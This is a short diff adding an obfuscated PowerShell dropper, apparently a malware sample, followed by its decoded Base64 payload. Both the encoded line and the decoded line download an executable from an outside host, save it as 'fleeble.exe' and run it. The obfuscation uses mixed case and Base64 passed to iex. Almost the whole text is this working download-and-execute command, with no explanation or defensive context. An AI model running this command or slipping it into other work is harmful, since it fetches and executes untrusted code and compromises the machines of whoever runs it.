@@ -1,0 +1,7 @@
+iex([sySTEM.TExT.ENCOdInG]::utF8.GetStrINg([SyStEm.CoNVerT]::fRoMbAse64StRiNG('CihOZXctT2JqZWN0IFNZc3RFbS5ORVQud0ViY2xJZW5UKS5Eb1dOTG9BZGZpbGUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vS1VLVS5leGUnLCdmbGVlYmxlLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2ZsZWVibGUuZXhlJwoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SYstEm.NET.wEbclIenT).DoWNLoAdfile('http://worldnit.com/KUKU.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
